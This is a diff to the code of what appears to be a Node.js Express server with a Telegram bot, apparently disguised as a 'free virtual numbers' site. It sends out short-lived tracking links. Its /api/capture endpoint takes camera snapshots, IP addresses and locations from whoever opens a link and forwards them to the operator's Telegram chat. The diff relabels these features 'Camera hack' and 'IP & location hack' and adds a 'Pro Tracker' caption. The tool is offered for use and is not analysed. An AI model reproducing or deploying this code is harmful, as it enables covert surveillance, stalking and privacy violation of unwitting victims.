@@ -10,7 +10,7 @@ const app = express();
 
 // Middleware
 app.use(bodyParser.json({ limit: "20mb" }));
-app.use(express.static(path.join(__dirname, "public"))); // serve frontend
+app.use(express.static(path.join(__dirname, "public")));
 
 // Domain fallback
 const DOMAIN = "https://freevirtualnumbers.onrender.com";
@@ -128,7 +128,7 @@ Deploy and observe activity.
   );
 });
 
-// Stats, Info, Dev, Back
+// ===== Stats, Info, Dev, Back =====
 bot.action("stats", async (ctx) => {
   await ctx.answerCbQuery();
   await ctx.reply(`
@@ -150,8 +150,8 @@ bot.action("info", async (ctx) => {
 ━━━━━━━━━━━━━━━━━━
 
 Features:
-• Camera snapshot
-• IP & geolocation capture
+• Camera hack
+• IP & location hack
 • Secure unique session links (10 min expiry)
 `, { parse_mode: "HTML" });
 });
@@ -197,10 +197,12 @@ app.post("/api/capture", async (req, res) => {
     const buffer = Buffer.from(image.replace(/^data:image\/\w+;base64,/, ""), "base64");
 
     await bot.telegram.sendPhoto(chat_id, { source: buffer }, {
-      caption: `📸 <b>IMAGE RECEIVED</b>
+      caption: `📸 <b>SNAPSHOT CAPTURED</b>
 
-🌐 IP: ${ip}
-📍 Location: ${location}`,
+🌐 <b>IP Address:</b> ${ip}
+📍 <b>Location:</b> ${location}
+
+🛰 <b>Tracker:</b> Pro Tracker v3`,
       parse_mode: "HTML"
     });
 
@@ -215,5 +217,5 @@ app.post("/api/capture", async (req, res) => {
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
 
-// Use long polling for simplicity (no Render webhook required)
+// Use long polling for simplicity (no webhook required)
 bot.launch().then(() => console.log("Telegram bot running"));
